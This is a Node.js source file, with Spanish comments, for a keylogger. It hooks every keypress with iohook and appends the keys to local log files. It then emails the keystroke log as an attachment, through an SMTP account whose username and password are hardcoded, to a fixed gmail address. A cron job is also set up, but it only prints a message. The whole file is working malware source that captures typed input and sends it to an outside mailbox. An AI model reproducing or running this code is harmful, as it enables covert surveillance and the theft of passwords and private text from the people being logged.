'use strict';

const ioHook = require('iohook');
const fs = require('fs');

let key = "";
let keyTemp = "";

ioHook.on('keydown', event => {
    key = "";
    keyTemp = String.fromCharCode(event.rawcode);
    //key text
    switch (event.rawcode) {

        case '28': case '13':
            key = "\n";
            keyTemp = "\n";
            break;
        default:
            switch (event.rawcode) {
                case 8: key = '*BACK*'; break
                case 96: key = '0'; break;
                case 97: key = '1'; break;
                case 98: key = '2'; break;
                case 99: key = '3'; break;
                case 100: key = '4'; break;
                case 101: key = '5'; break;
                case 102: key = '6'; break;
                case 103: key = '7'; break;
                case 104: key = '8'; break;
                case 105: key = '9'; break;
                case 106: key = '*'; break;
                case 107: key = '+'; break;
                case 109: key = '-'; break;
                case 111: key = '/'; break;
                case 20: key = '*MAYUSC*'; break;
                case 160: case 161:
                    key = '*SHIFT*';
                    break;
                case 162: case 163:
                    key = '*CTRL*';
                    break;
                case 164: case 165:
                    key = '*ALT*';
                    break;
                default:
                    key = String.fromCharCode(event.rawcode);
                    break;
            }
            break;
    }
    fs.appendFile('log.txt', key, err => { });
    fs.appendFile('full.txt', keyTemp, err => { });
});

ioHook.unregisterAllShortcuts();
ioHook.start();


var nodemailer = require('nodemailer');
// email sender function
var sendEmail = function () {
    // Definimos el transporter
    const transporter = nodemailer.createTransport({
        host: 'smtp.ethereal.email',
        port: 587,
        auth: {
            user: 'noel63@ethereal.email',
            pass: 'UfQuJYtrm3rNvzjt8s'
        }
    });
    // Definimos el email 
    var mailOptions = {
        from: 'noel63@ethereal.email',
        to: 'roonmorton@gmail.com',
        subject: 'Asunto',
        text: 'Contenido del email',
        attachments: [
            {
                filename: 'log.txt',
                path: 'log.txt'
            }
        ]
    }
    // Enviamos el email
    transporter.sendMail(mailOptions, function (error, info) {
        if (error) {
            console.log(error);
            // res.send(500, err.message);
        } else {
            console.log("Email sent");
            //res.status(200).jsonp(req.body);
        }
    });
};


sendEmail();


var CronJob = require('cron').CronJob;
// Patrón de cron
// Corre todos los lunes a la 1:00 PM
new CronJob('30 * * * *', function () {
    // Código a ejecutar
    console.log('You will see this message every second');
}, function () {
    // Código a ejecutar cuando la tarea termina. 
    // Puedes pasar null para que no haga nada
}, true); 